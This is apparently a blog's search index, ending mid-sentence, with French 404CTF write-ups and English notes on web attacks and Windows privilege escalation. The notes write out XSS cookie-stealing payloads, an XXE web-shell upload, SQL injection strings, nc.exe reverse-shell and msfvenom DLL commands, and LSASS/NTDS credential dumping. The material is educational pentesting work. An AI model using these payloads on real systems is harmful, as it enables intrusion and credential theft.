"/CTFs/404CTF/Web/Fiche_JS", "categories": "CTFs, 404CTF, Web", "tags": "Web, Fiché JS", "date": "2022-11-07 00:00:00 +0100", "snippet": "Fiché JSDans ce chall on a un site assez classique :Mais lorsqu’on regarde le code source, on voit une fonction assez spéciale :Je mets le texte étrange dans une variable nommée texte et utilise la fonction pour décoder le message :C’est du jsfuck on le décode à l’aide d’outil en ligne et on obtient :On se rend donc sur la page et voilà on a le flag :" }, { "title": "CTFs | 404CTF | Web", "url": "/CTFs/404CTF/Web", "categories": "CTFs, 404CTF, Web", "tags": "", "date": "2022-11-07 00:00:00 +0100", "snippet": "WebFiché JS :https://nouman404.github.io/CTFs/404CTF/Web/Fiche_JSLe braquage :https://nouman404.github.io/CTFs/404CTF/Web/Le_braquage" }, { "title": "CTFs | 404CTF | Stegano | Stereographie", "url": "/CTFs/404CTF/Stegano/Stereographie", "categories": "CTFs, 404CTF, Stegano, Stereographie", "tags": "CTF, 404CTF, Stegano", "date": "2022-11-07 00:00:00 +0100", "snippet": "StéréographieNous avons là un son…Lorsqu’on regarde sous Audacity ce son on remarque que certaines partie se resemble notemment la 1er et la 3e (404 ?) :En fesant un peu de recherche, on se retrouve a chercher des oscilloscope et je tombe sur le site : https://dood.al/oscilloscope/On lance l’audio et on a le flag qui s’affiche lettre par lettre :404CTF{AV3Z_V0U5_U71L153_UN_VR41_05C1LL05C0P3}" }, { "title": "CTFs | 404CTF | Stegano | Un logo obese 1", "url": "/CTFs/404CTF/Stegano/PNG_Un_logo_obese/Un_logo_obese1", "categories": "CTFs, 404CTF, Stegano, Un logo obèse", "tags": "CTF, 404CTF, Stegano", "date": "2022-11-07 00:00:00 +0100", "snippet": "PNG : Un logo obèse 1/4On commence avec une image contenant le logo de Hallebarde En effectuant la commande “string” dessus, nous voyons un certain fichier “out/stage2.png” On essaye de l’extraire avec Binwalk Et voilà, on a notre flag :)" }, { "title": "CTFs | 404CTF | Stegano | Drôle de chimère", "url": "/CTFs/404CTF/Stegano/PNG_Un_logo_obese/Drole_de_chimere", "categories": "CTFs, 404CTF, Stegano, Un logo obèse", "tags": "CTF, 404CTF, Stegano", "date": "2022-11-07 00:00:00 +0100", "snippet": "PNG : Un logo obèse 2/4Maintenant, nous nous retrouvons avec une image de cassette :En regardant le code hexa de cette image on se rend compte qu’il y a dans la signature de la fonction deux en-têtes IHDR et entre ces deux en-têtes il y a un en-tête sTeG.Etrange !?!On essaye de supprimer la partie entre les deux IHDR et on supprime le deuxième :Notre signature PNG est maintenant correcte, on sauvegarde et on a le 2e flag : Ressources :Bless (éditeur hexa)w3.org" }, { "title": "CTFs | 404CTF | Stegano | La plume à la main", "url": "/CTFs/404CTF/Stegano/La_plume_a_la_main", "categories": "CTFs, 404CTF, Stegano, La plume à la main", "tags": "CTF, 404CTF, Stegano", "date": "2022-11-07 00:00:00 +0100", "snippet": "La plume à la mainIci, nous avons un texte de Victor HugoLe texte à l’air normal. Mais lorsqu’on compare avec l’originale, on se rend rapidement compte que certaines lettres ont été changées.(https://www.ibibliotheque.fr/les-miserables-victor-hugo-hug_miserables/lecture-integrale/page23).Ces lettres sont toutes au début de la ligne. Si nous récupérons la première lettre de chaque ligne, nous avons le flag :V1v3_l4_Fr4nc3_l1br3" }, { "title": "CTFs | 404CTF | Stegano", "url": "/CTFs/404CTF/Stegano", "categories": "CTFs, 404CTF, Stegano", "tags": "CTF, 404CTF, Stegano", "date": "2022-11-07 00:00:00 +0100", "snippet": "Stéganographie La plume à la main PNG : Un logo obèse [1/4] PNG : Drôles de chimères [2/4] Stéréographie " }, { "title": "CTFs | 404CTF | RESO | À l'aube d'un échange", "url": "/CTFs/404CTF/RESO/A_l_aube_d_un_echange", "categories": "CTFs, 404CTF, RESO, À l'aube d'un échange", "tags": "CTF, 404CTF, RESO", "date": "2022-11-07 00:00:00 +0100", "snippet": "À l’aube d’un échangeNous avons ici une image prise au coucher de soleil. On ne voit pas grand-chose hormis deux gratte-ciels et une église.Soit on sait qu’ils se trouvent à Lyon soit nous devons chercher la liste des gratte-ciel de France.On trouve rapidement le “Tour Incity” puis la “Tour Part-Dieu”.Personnellement, j’ai préféré utiliser Google Earth pour la dernière partie qui consiste à trouver l’emplacement exact de la photo. En se déplaçant, on trouve le lieu grâce aux deux tours et à l’église (St-Nizier) sur la gauche :On voit que le numéro de rue est 17 Mnt Saint-Barthélemy:Le flag doit être de la forme :On a donc md5(mnt-saint-barthelemy). Mais mnt signifie montée (cf: abréviation)Ce qui nous donne : md5(montee-saint-barthelemy) = eb66c65861da9fe667f26667b3427d2cLe flag est donc : 404CTF{eb66c65861da9fe667f26667b3427d2c}" }, { "title": "CTFs | 404CTF | RESO | Equipement désuet", "url": "/CTFs/404CTF/RESO/Equipement_desuet", "categories": "CTFs, 404CTF, RESO, Equipement désuet", "tags": "CTF, 404CTF, RESO", "date": "2022-11-07 00:00:00 +0100", "snippet": "Equipement désuetOn a ici une image d’un minitel. Ancêtre de l’ordinateur et de l’internet qu’on connait aujourd’hui.Si nous ne savions pas que c’était un minitel, on peut toujours regarder sur yandex ou demander à son père…On cherche sur Wikipédia la date d’arrêt d’usage et on a le flag : 404CTF{30_06_2012}" }, { "title": "CTFs | 404CTF | RESO", "url": "/CTFs/404CTF/RESO", "categories": "CTFs, 404CTF, RESO", "tags": "CTF, 404CTF, RESO", "date": "2022-11-07 00:00:00 +0100", "snippet": "Renseignement en sources ouvertesEquipement désuet :https://nouman404.github.io/CTFs/404CTF/RESO/Equipement_desuetÀ l’aube d’un échange :https://nouman404.github.io/CTFs/404CTF/RESO/A_l’aube_d’un_echange" }, { "title": "CTFs | 404CTF | Divers | Je suis une théière", "url": "/CTFs/404CTF/Divers/Je_suis_une_theiere", "categories": "CTFs, 404CTF, Divers, Je suis une théière", "tags": "CTF, 404CTF, Divers", "date": "2022-11-07 00:00:00 +0100", "snippet": "Je suis une théièrePour ce challenge, on devait trouver une page où se trouvait une théière. Mais où ???Si on regarde les sous-domaines du site http://404ctf.fr, on trouve un domaine étrange : https://hello-world.404ctf.fr/Il faut résoudre le labyrinthe. On se déplace du nombre de case qui est indiquée par celle sur laquelle on est (ex.: on est sur une case avec le numéro 2, ça veut dire qu’on peut se déplacer de deux cases dans n’importe quelle direction.Le chemin est le suivant :À chaque déplacement, on note les valeurs qu’il y a sur le four et on obtient une chaine en base64. On décode et on a le flag :" }, { "title": "CTFs | 404CTF", "url": "/CTFs/404CTF/", "categories": "CTFs, 404CTF", "tags": "", "date": "2022-11-07 00:00:00 +0100", "snippet": "404CTF_2022J’ai participé au 404CTF et suis arrivé 378/2460. Vous trouverez ici la plupart des challenges que j’ai pu résoudre.Divers :https://nouman404.github.io/CTFs/404CTF/Divers/Je_suis_une_theiereRenseignement en sources ouvertes :https://nouman404.github.io/CTFs/404CTF/RESOStéganographie :https://nouman404.github.io/CTFs/404CTF/SteganoWeb :https://nouman404.github.io/CTFs/404CTF/Web/" }, { "title": "Notes | Common Web Attacks", "url": "/Notes/Web/Common_Web_Attacks", "categories": "Notes, Web, Common Web Attacks", "tags": "Web, Common Web Attacks, XSS, XXE, IDOR, SQLi", "date": "2022-09-11 00:00:00 +0200", "snippet": "Common Web AttacksThe World Wide Web allows us to access a lot of information over the internet, whether it is a movie, your family pictures or your mail. This is also a very big battlefield between every kind of hackers. Here, we are going to talk about common web vulnerabilities such as Cross Site Scripting (XSS), XML External Entity (XXE), Insecure Direct Object Reference (IDOR) and SQL Injection (SQLi).XSSXSS vulnerability result in the possibility for a user to execute Java Script code in the web page. This can change the content of the page or steal connection cookies, for example. You can find a basic exmplanation of XSS on this video. There are three different type of XSS : Reflected XSS, where the malicious script comes from the current HTTP request. Stored XSS, where the malicious script comes from the website’s database. DOM-based XSS, where the vulnerability exists in client-side code rather than server-side code.Reflected XSSThe most basic type of cross-site scripting is Reflected XSS. It occurs when an application receives data from an HTTP request and unsafely incorporates that data into the immediate response.A very simple example will be the following. Imagine a webpage that ask for the user name and execute the following GET request :https://insecure-website.com/search?name=bobThis request will then print Your name is : NAME where NAME will be replaced by the name given. If the website is vulnerable to Reflected XSS, we could put a script as a name like :https://insecure-website.com/search?name=&lt;script&gt;JS_CODE&lt;/script&gt;You can replace JS_CODE by anything you want. A basic test could be :&lt;script&gt;alert(1)&lt;/script&gt;The alert JS function will create a pop-up that will display the text between the brackets. But as stated in this video of LiveOverflow, the alert(1) isn’t a good practice and can lead to false positive. A better way to test XSS could be the use of alert(document.domain) or alert(windows.origin) you could even use the console.log JS function.Stored XSSSecond-order or persistent XSS, often known as Stored XSS, occurs when an application obtains data from an unreliable source and includes that data inadvertently in subsequent HTTP responses.As its name suggest, the Stored XSS is Stored in the server. It often appears when someone leaves a comment and that other people can read it. The attack is basically the same for every type of XSS so you can use the previous techniques to check if the website is vulnerable.DOM-based XSSWhen client-side JavaScript in an application handles data from an untrusted source in an unsafe manner, typically by publishing the data back to the DOM, this is referred to as DOM-based XSS, also known as DOM XSS.DOM-based XSS are a bit harder to find. First we want to check for JS code in the page that we can interact with, like a document.write that write our input, for example. DOM.innerHTML and DOM.outerHTML are other JS function that write DOM objects (add(), after(), append() are some JQuery functions that write DOM objects). Once we understand how the script work we may want to close some HTML tags so that we can input our JS malicious code. This is an example that show how to close a simple HTML tag that includes our input in its field (like an image for example) :https://insecure-website.com/search?name=\"&gt;&lt;script&gt;JS_CODE&lt;/script&gt; You can find more detailed information about XSS on the PortSwigger website. You can use the document.cookie JS function to retrieve the cookie of a user.Session HijakingXSS can be used to recover sensitive information like connection cookies. We need to setup our environment so that the payload can send us back the information. First, we will start a php server on our machine and then use ngrok so that our web server is available anywhere online.php -S localhost:1234andngrok http 1234 In real case scenario or in realistic CTF you may want to use a more standard port like 443 which is the port for HTTPS You may need to create a Ngrok account for this to work. Visit the created page and it should ask you to create an account.Now that our environment is ready we can send our payload like :&lt;script&gt;window.open(\"[URL]?\"+document.cookie)&lt;/script&gt;or&lt;script&gt;document.location=\"[URL]?\"+document.cookie;&lt;/script&gt;or&lt;script&gt;document.write('&lt;img src=\"[URL]?'+document.cookie+'\"/&gt;');&lt;/script&gt;Don’t forget to replace [URL] by the url ngrok gives you. This will send the cookie of the person that visit the page where our payload is executed.You can find many other payload on PayloadsAllTheThings.AutomationThere are many tools out here that can help you detect XSS vulnerabilities like Nessus, Burp Pro, ZAP. There are also some opensource tools that you can find on github like XSStrike, BruteXSS or XSSer.Here is a list of different payload you may want to try when looking for XSS vulnerabilities PayloadsAllTheThings.XXEXML eXternal Entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application’s processing of XML data. This allows an attackers to interact with any back-end or external systems that the program itself can access as well as examine files on the application server disk.By using the XXE vulnerability to launch Server-Side Request Forgery (SSRF) attacks, an attacker may be able to escalate a XXE assault to compromise the underlying server or other back-end infrastructure in some circumstances.Extensible Markup Language (XML) is a markup language and file format for storing, transmitting, and reconstructing arbitrary data. It defines a set of rules for encoding documents in a format that is both human-readable and machine-readable.Here is a list of some of the key elements of an XML document : Key Definition Example Tag The keys of an XML document, usually wrapped with (&lt;/&gt;) characters. &lt;date&gt; Entity XML variables, usually wrapped with (&amp;/;) characters. &amp;lt; Element The root element or any of its child elements, and its value is stored in between a start-tag and an end-tag. &lt;date&gt;20-10-2022&lt;/date&gt; Attribute Optional specifications for any element that are stored in the tags, which may be used by the XML parser. version=\"1.0\"/encoding=\"UTF-8\" Declaration Usually the first line of an XML document, and defines the XML version and encoding to use when parsing it. &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; DTDThe XML Document Type Definition (DTD) contains declarations that can define the structure of an XML document, the types of data values it can contain, and other items. The DTD is declared within the optional DOCTYPE element at the start of the XML document. The DTD can be fully self-contained within the document itself (known as an internal DTD) or can be loaded from elsewhere (known as an external DTD) or can be hybrid of the two.XML EntitiesIn XML, we can create custom entities that can be defined within the DTD :&lt;!DOCTYPE foo [ &lt;!ENTITY entity_ref \"my value\" &gt; ]&gt;This definition means that any usage of the entity reference &amp;entity_ref; within the XML document will be replaced with the defined value: my value.External entities can be used with the SYSTEM attribute. We can access files or resources from other websites :&lt;!DOCTYPE foo [ &lt;!ENTITY ext_entity SYSTEM \"http://website.com\" &gt; ]&gt;or&lt;!DOCTYPE foo [ &lt;!ENTITY ext_entity SYSTEM \"file:///path/to/file\" &gt; ]&gt; This can allow us to access files such as the passwd one like this : &lt;!ENTITY read SYSTEM 'file:///etc/passwd'&gt;UsageFirst of all, we need to intercept a request made to the server to see if our request has its data written in XML.Then we need to spot where we can use a XXE. If you fill out a form and they tell you something like “an email has been sent to XXX@YYY.com” then you may need to exploit the email part of the form. We now can use a simple payload to see if it’s vulnerable like :&lt;!DOCTYPE email [ &lt;!ENTITY user_mail \"Test Text\"&gt;]&gt;Now if the previous text says “an email has been sent to Test Text” it may be vulnerable. We can now use the same technic to read files like we saw previously. But if we try to read the source code of a .php file it may not work because it will print the page instead of its source code. To read is source code, we can use the PHP Wrapper technic :&lt;!DOCTYPE email [ &lt;!ENTITY user_mail SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"&gt;]&gt;This command will print the source code of index.php encoded in base64. You can use online tools such as base64decode.org, the BurpSuite Decoder or the bash command to decode it :echo \"BASE64_ENCODED_TEXT\" | base64 -d You can use the Exept Wrapper to create a RCE with the basic expect://id or like that : Create a php shell :echo '&lt;?php system($_REQUEST[\"cmd\"]);?&gt;' &gt; shell.php Create a web server to host our php shellsudo python3 -m http.server 80 Use the XXE to upload our shell&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE email [ &lt;!ENTITY user_mail SYSTEM \"expect://curl$IFS-O$IFS'OUR_IP/shell.php'\"&gt;]&gt;IDORInsecure direct object references (IDOR) are a type of access control vulnerability that arises when an application uses user-supplied input to access objects directly.A typical example would be a get parametter that isn’t sanitized :http://insecure_website/index.php?user_id=43If we are the user with the ID 43 what could possibly happen if we change this value to 0 or 1 ? Generally the first user is the admin.Just exposing a direct reference to an internal object or resource is not a vulnerability in itself. For example, if the ID we specify is for the number of a page. It’s all about weak access control system. You can read more about access control hereWhen looking, like here, for ID, name or any other type of token we may want to automate the process so we don’t do all the research by hand. We can use tools such as the Burp Intruder, the ZAP fuzzer or even tools such as ffuf.SQLiSQL is a language that allows us to ask information to a database. This information can be name, adress, date, password… It can be anything we want. These queries are made in a DBMS (DataBase Management System), the most famous are SQLite, MySQL, MariaDB, Microsoft SQL Server or even Oracle DBMS. The goal here is not to teach you how SQL work or what are all the differences between tow DBMS but you can read this article for more information. We are just going to see the bases so you are not completely lost but I advise you to follow some courses about the SQL language.DefinitionFor this example, we are going to imagine a database of a school with professors and students:As you can see there are two teachers and two students. Professor and Teacher are the two tables of the database. It can be seen as an array containing different data. Each one has an id, a name and a surname those are the attributes ot the tables. ID is usually used to differentiate two entry of a table. We could have a student and a professor that have the same name and the same surname. If this happens and we don’t have an ID how can we differentiate them ? For each entry, we have several value. For the first professor, the value for the id is 1, for the name it’s name1 and for the surname it’s sur1. As I said, ID need to be different to differentiate two students or two professors but I’m talking about ID of a certain table. Of course we can have a student with the same ID as a professor because they are not in the same table.Basic SQL CommandsNow that you have a better understanding of a database, we can look on how to recover that data. The most common way is to recover all entries of a table :SELECT * FROM STUDENT;If we want to look for specific attributes, we can do :SELECT name, surname FROM STUDENT;Here we don’t have much student but if we had hundred of them, we could display all students that have an id greater than 50 like this :SELECT name, surname FROM STUDENT WHERE id &gt; 50 ;As I said previously, we are not going in depth into SQL and it’s query so you may want to look at some online courses about the SQL language and its queries. Note that SQL queries isn’t case sensitive. It means that you can write SELECT or select.Common SQLiThe most common SQLi is in connection forms. You are asked to give a username and password. If I enter my credentials, the query may look like the following one and if there is no entry returned, it means that I gave a wrong password and/or a wrong user.SELECT * FROM usertable WHERE profileID='batbato' AND password = 'batbato'But what happens if I put as a user an apostrophe (') ? The query will look like :SELECT * FROM usertable WHERE profileID=''' AND password = 'batbato' Note that inputting an apostrophe (') or a quote (\") can print an error message if the debugger mode has not been disabled.This will result in an error. But we can comment on the rest of the command so that the command will only look for the username. Comments can be -- -COMMENT or #COMMENT.SELECT * FROM usertable WHERE profileID='admin' -- -' AND password = 'batbato'This command where our user is admin' -- - is equivalent to :SELECT * FROM usertable WHERE profileID='admin'But what if the admin username isn’t “admin” ? We can use the well-known payload OR 1=1 (equivalent to OR True) so that we get the first user :SELECT * FROM usertable WHERE profileID='admin' OR 1=1 -- -' AND password = 'batbato' Note that the apostrophe is important ! If the profileID is a decimal, it may not require an apostrophe and if the query use quote (\") then your payload should contain quotes instead of apostrophes.UNIONIn SQL, we can use the UNION to combine the result-set of two or more SELECT statements.ex:SELECT column_name(s) FROM table1UNIONSELECT column_name(s) FROM table2; Instead of the connection form, here we are going to look at something like a search bar. First we need to look for the number of columns of the query. We will try to input :' UNION SELECT NULL -- -If this doesn’t print NULL, we can try :' UNION SELECT NULL, NULL -- -Again and again until we see the NULL where the result should be output. For the rest of the example we are going to assume we have two columns.We look for the name of the database with schema_name from the table INFORMATION_SCHEMA.SCHEMATA:' UNION SELECT 1,group_concat(0x7c,schema_name,0x7c) FROM INFORMATION_SCHEMA.SCHEMATA -- - Note the use of group_concat(0x7c,schema_name,0x7c). This will display all the attributes in a single cell separated by |. If there is not enough space to show all the attributes, we can show them all at once with group_concat().We obtain all the databases names. Imagine we found the database SCHOOL from the previous example. We look for the tables it contains :' UNION SELECT group_concat(0x7c,TABLE_NAME,0x7c),group_concat(0x7c,TABLE_SCHEMA,0x7c) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='SCHOOL' -- -If we want to have a look at the Student table, we can list the names of the columns like that :' UNION SELECT group_concat(0x7c,COLUMN_NAME,0x7c),group_concat(0x7c,TABLE_NAME,0x7c) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='Student' -- -We get the name and the surname with :' UNION SELECT group_concat(0x7c,name,0x7c),group_concat(0x7c,surname,0x7c) FROM Student -- -If there are some protections, you can try to bypass them by encoding your queries, changing the case… This PortSwigger article can explain it to you." }, { "title": "Notes | Windows Privilege Escalation", "url": "/Notes/Privilege_Escalation/Windows_PE", "categories": "Notes, Privilege Escalation, Windows_PE", "tags": "Web, Privilege Escalation, Windows, PE, Administrator", "date": "2022-09-02 00:00:00 +0200", "snippet": "Windows Privilege EscalationAs with the Linux operating system, a misconfigured Windows machine can allow an attacker to gain Administrator or NT AUTHORITY\\SYSTEM rights. While the Administrator is a user on any Windows machine, NT AUTHORITY\\SYSTEM, often called SYSTEM, is an account that has the most rights but to which you cannot log in with credentials. For reading purpose, I won’t tell if we are using a CMD console when running a command but will display a command that uses Powershell like PS&gt; COMMAND.Network Information GatheringIPconfigAs for a Linux machine, we may want to check for the network of the machine. We can print information about its internet network with the command ipconfig :ipconfig /allThis will allow us to know if there is more than one network interface which can be leveraged to access a computer on a sub-network.ARPWe can use the arp command to check for other computers on the network like this :arp -aRouting TableThe routing table can show us what routes can packages take on the network :route printNetstatThe netstat command can show us if there is any service running on the machine that may be leveraged :netstat -anoWindows Defender &amp; AppLocker RulesTo display information about Windows Defender or the AppLocker rules we can run the followinf commands :PS &gt; Get-MpComputerStatusPS &gt; Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollectionsBasic EnumerationIt’s important to have information about the computer we are attacking. Like on Linux, we can, for example, list the running processes with the tasklist command :tasklist /svcSystem informationWe can list environment variables with the set command. With the systeminfo we can get a lot of information about the computer we are in like the host name, the OS Version, the type of processor used…To see if a machine is up to date, we can look to its hotfixes with the following command and by checking the Microsoft website:wmic qfeorPS &gt; Get-HotFix | ft -AutoSize You can search for a specific hotfix hereWe can look at the path variables like this :PS &gt; cmd /c echo %PATH%Program installedWe can check for non-standard applications that may have been installed by a user or an administrator :wmic product get nameorPS &gt; Get-WmiObject -Class Win32_Product | select Name, VersionRPCA user can connect to a machine with the RPC protocol. We can look if another user is connected on our machine with the query user command. If you want to know how to impersonate this user check this part of my blog.Current User PrivilegesWhen we arrive on a machine we may want to know which user we are or what are our rights. To check our user we can use the whoami or the echo %USERNAME% command. To see which rights our user has we can run the command whoami /priv and if we are a classic user we may get this output.whoami /privPRIVILEGES INFORMATION----------------------Privilege Name Description State============================= ============================== ========SeChangeNotifyPrivilege Bypass traverse checking EnabledSeIncreaseWorkingSetPrivilege Increase a process working set Disabled As you can see, we have some privileges that are disabled. You can enable them all using this script or this one. First enable the script Import-Module .\\EnableAllTokenPrivs.ps1 and then run it .\\EnableAllTokenPrivs.ps1.We may want to check which group we are in because we can inherit privileges from certain.whoami /groupsWe may also want to look for other users with the net user command or the list of all groups with this net localgroup command. To get information about a certain group you can use net localgroup GROUP_TO_CHECK.Exploit User RightsSeImpersonate &amp; SeAssignPrimaryTokenEvery process in Windows has a token that contains details about the account that is operating it. Since these tokens are merely memory addresses that can be brute-forced by users who are unable to access memory, they are not thought of as secure resources. The SeImpersonate privilege is required to use the token. Only administrator accounts are granted access to it, and in most circumstances, it can be taken away during system hardening.We are going to use JuicyPotato that can be used to exploit the SeImpersonate or SeAssignPrimaryToken privileges via DCOM/NTLM reflection abuse. Start a netcat listener on your attacker machine and then launch this command :c:\\tools\\JuicyPotato.exe -l 53375 -p c:\\windows\\system32\\cmd.exe -a \"/c c:\\tools\\nc.exe ATTACKER_IP ATTACKER_PORT -e cmd\" -t * You may get issues if you don’t put the full path of a file. Note that we are using a cmd reverse shell but we can of course use powershell instead. If you are not running the exploit from a running process like an SQL server. You may need to add the -c flag. Then add a value, depending on the machine you are on, from here. If the first value doesn’t work try the second, then the third… until it works.Where JuicyPotato doesn’t work Windows Server 2019 and Windows 10 build 1809 onwards, RoguePotato and PrintSpoofer do work.c:\\tools\\PrintSpoofer.exe -c \"c:\\tools\\nc.exe ATTACKER_IP ATTACKER_PORT -e cmd\"orc:\\tools\\RoguePotato.exe -r ATTACKER_IP -e \"c:\\tools\\nc.exe ATTACKER_IP ATTACKER_PORT -e cmd\" -l LISTENING_PORT Note that we are using a cmd reverse shell but we can of course use powershell instead.SeDebugPrivilegeInstead of adding the account to the administrators group, a user may be given the SeDebugPrivilege to run a specific program or service or help with troubleshooting. To leverage this privilege we can dump process memory. The Local Security Authority Subsystem Service (LSASS) process is a good target. We can do it with the GUI or with the command line. With the GUI, you will need to launch the Task Manager, go to the Details section and find the lsass.exe process. When found, you can right click on it and select Create dump file. The command for the command line is :procdump.exe -accepteula -ma lsass.exe lsass.dmp procdump.exe may not be installed by default but you can install it from the Windows websiteNow that we have the lsass dump (lsass.dmp), we can run Mimikatz (you can also use the github repo).mimikatz.exeWhen on Mimikatz, we will try to dump password hashes :mimikatz # logUsing 'mimikatz.log' for logfile : OKmimikatz # sekurlsa::minidump lsass.dmpSwitch to MINIDUMP : 'lsass.dmp'mimikatz # sekurlsa::logonpasswords&lt;SNIP&gt;Authentication Id : 0 ; 23026942 (00000000:015f5cfe)Session : RemoteInteractive from 2User Name : bobDomain : WIN-TESTLogon Server : WIN-TESTLogon Time : 9/2/2022 2:59:52 PMSID : S-1-5-21-3769161915-3336846931-3985975925-1000 msv : [00000003] Primary * Username : bob * Domain : WIN-TEST * NTLM : cf3a5525ee9414229e66279623ed5c58 * SHA1 : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2&lt;SNIP&gt;SeTakeOwnershipPrivilegeThe SeTakeOwnershipPrivilege policy setting determines which users can take ownership of any securable object in the device, including Active Directory objects, NTFS files and folders, printers, registry keys, services, processes, and threads.First we can check who has the ownership of the file we are targeting :PS &gt; Get-ChildItem -Path 'C:\\Users\\bob\\Desktop\\Secret_Data.txt' | select name,directory, @{Name=\"Owner\";Expression={(Get-ACL $_.Fullname).Owner}}If there is no name on the Owner section, you can look a the owner of the directory where the file is located with the dir /q command. Now we can take the ownership :PS &gt; takeown /f 'C:\\Department Shares\\Private\\IT\\cred.txt'If we still can’t read the file, we can use the icacls command to change its Access Control Lists (ACL) :icacls 'C:\\Users\\bob\\Desktop\\Secret_Data.txt' /grant OUR_USER:FThis command will grant us full access (F) to the file.Exploit Groups PermissionsJust like the user privileges, groups allow you to do things that a normal user may not be able to do. To see in which group we are in you can use the command whoami /groups.Backup OperatorsWhen member of this group, we are granted the SeBackup and SeRestore rights. SeBackupPrivilege allows file content retrieval, even if the security descriptor on the file might not grant such access. A caller with SeBackupPrivilege enabled obviates the need for any ACL-based security check.Because we can’t use the standard copy command, we can use a program to copy files or just use the following PoC. As the Github states, we need to import the two dll in Powershell :PS &gt; Import-Module .\\SeBackupPrivilegeUtils.dllPS &gt; Import-Module .\\SeBackupPrivilegeCmdLets.dllTo check if the SeBackupPrivilege is enabled, we can use either the whoami /priv or the PS &gt; Get-SeBackupPrivilege command. If the privilege isn’t enabled, we can use the following command to enable it :PS &gt; Set-SeBackupPrivilegeImagine that we can’t read the content of the Secret_Data.txt on the bob desktop. We can use this command to copy it to a location where we have read rights.PS &gt; Copy-FileSeBackupPrivilege 'C:\\Users\\bob\\Desktop\\Secret_Data.txt' .\\Secret_Data.txtAttacking Domain Controler (NTDS.dit)This group also permits local domain controller logins. Given that it stores the NTLM hashes for all user and computer objects in the domain, the active directory database NTDS.dit makes for an extremely appealing target. However, unprivileged users cannot access this file since it is locked.The diskshadow command allows us to create a shadow copy of the C: drive.PS &gt; diskshadow.exeDISKSHADOW&gt; set verbose onDISKSHADOW&gt; set metadata C:\\Windows\\Temp\\meta.cabDISKSHADOW&gt; set context clientaccessibleDISKSHADOW&gt; set context persistentDISKSHADOW&gt; begin backupDISKSHADOW&gt; add volume C: alias cdriveDISKSHADOW&gt; createDISKSHADOW&gt; expose %cdrive% E:DISKSHADOW&gt; end backupDISKSHADOW&gt; exitNow if you try to list the directories of the E: drive, you will see the same tree structure as in the C: drive.The Copy-FileSeBackupPrivilege cmdlet allows us to bypass ACL and copy the NTDS.dit wherever we want :PS &gt; Copy-FileSeBackupPrivilege E:\\Windows\\NTDS\\ntds.dit C:\\Users\\Public\\Downloads\\ntds.dit You also use tools to extract the ntds.dit file like robocopy : robocopy /B E:\\Windows\\NTDS .\\ntds ntds.ditWe can now export SAM and SYSTEM registery hives and try to crack local user passwords. First we need to export these hives :reg save HKLM\\SYSTEM SYSTEM.SAVreg save HKLM\\SAM SAM.SAVNow that we have the SAM and SYSTEM registery hives, we can extract all AD account credentials using tools such as secretsdump.py or the PowerShell DSInternals : DSInternalsPS &gt; Import-Module .\\DSInternals.psd1PS &gt; $key = Get-BootKey -SystemHivePath .\\SYSTEMPS &gt; Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\\ntds.dit -BootKey $key&lt;CREDS&gt; Secretsdumpsecretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCALImpacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation[*] Target system bootKey: 0xc0a9116f907bd37afaaa845cb87d0550[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)[*] Searching for pekList, be patient[*] PEK # 0 found and decrypted: 85541c20c346e3198a3ae2c09df7f330[*] Reading and decrypting hashes from ntds.dit Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::Bob:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;SNIP&gt; secretsdump.py is part of the Impaket collection. If you already have Impaketinstalled on your computer you already have the secretsdump.py too. You can use locate secretsdump.py` to locate it. You can use this output for a pass the hash attack or try to crack it with Hashcat.Event Log ReadersMembers of this group can read event logs from local computers. The group is created when the server is promoted to a domain controller. You can try finding commands ran with credentials using either the CMD or Powershell :wevtutil qe Security /rd:true /f:text | findstr \"/user\"PS &gt; wevtutil qe Security /rd:true /f:text | Select-String \"/user\"orPS &gt; Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}DnsAdminsMembers of DnsAdmins group have access to network DNS information. The default permissions are as follows: Allow: Read, Write, Create All Child objects, Delete Child objects, Special Permissions. This group exists only if the DNS server role is or was once installed on a domain controller in the domain. Membership in this group may be used to increase privileges on a Domain Controller or in cases where a different server is serving as the domain’s DNS server because the DNS service is run as NT AUTHORITY\\SYSTEM.Leveraging DnsAdmins AccessFirst we will create a malicious dll file to add your user to the domain admins or to create a reverse shell on our attacker Linux machine :msfvenom -p windows/x64/exec cmd='net group \"domain admins\" USER /add /domain' -f dll -o adduser.dllormsfvenom -p windows/shell/reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f dll -o shell-cmd.dllNow that our .dll malicious file is created you can upload it to the Windows machines using the method of your choice (HTTP, SMB, FTP server…).If you start a HTTP server you can download the file on windows using the following command :wget \"http://IP:PORT/YOUR_MALICIOUS_FILE.dll\" -outfile \"YOUR_MALICIOUS_FILE.dll\"If you are not a member of the DnsAdmins group you may get an error when trying to execute your malicious dll.dnscmd.exe /config /serverlevelplugindll C:\\Users\\Public\\Downloads\\YOUR_MALICIOUS_FILE.dll You can check if you are a member of the DnsAdmins group with the command : Get-ADGroupMember -Identity DnsAdmins. We must specify the full path to our malicious DLL or the attack will not work properly.To receive our reverse shell or to add our user to a certain group we need to stop the DNS service and start it back :sc stop dnssc start dnsYou can also use the mimilib.dll (by the creator of Mimikatz) explained in this blog to abuse the dns admin group privileges.Creating a WPAD RecordClients can utilize the Web Proxy Auto-Discovery (WPAD) Protocol to find the URL of a configuration file using DHCP and/or DNS discovery techniques. The configuration file can be invoked to find the proxy for a given URL after detection and download are finished.For this attack to work, we first need to disable the Global Query Block List :PS &gt; Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.DOMAIN_NAME.localWe can now add our attacker machine to 